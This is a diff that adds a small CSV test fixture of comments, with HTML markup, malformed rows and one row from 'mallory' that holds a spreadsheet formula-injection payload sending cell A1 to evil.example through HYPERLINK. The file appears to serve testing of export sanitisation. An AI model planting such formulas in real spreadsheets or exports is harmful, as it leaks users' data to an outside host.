@@ -1,0 +1,7 @@
+author,body
+alice,Hello <b>world</b>!
+bob,<b>hola</b>
+bob,segundo comentario
+mallory,=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")
+eve,uno,dos,tres
+fila,fantasma
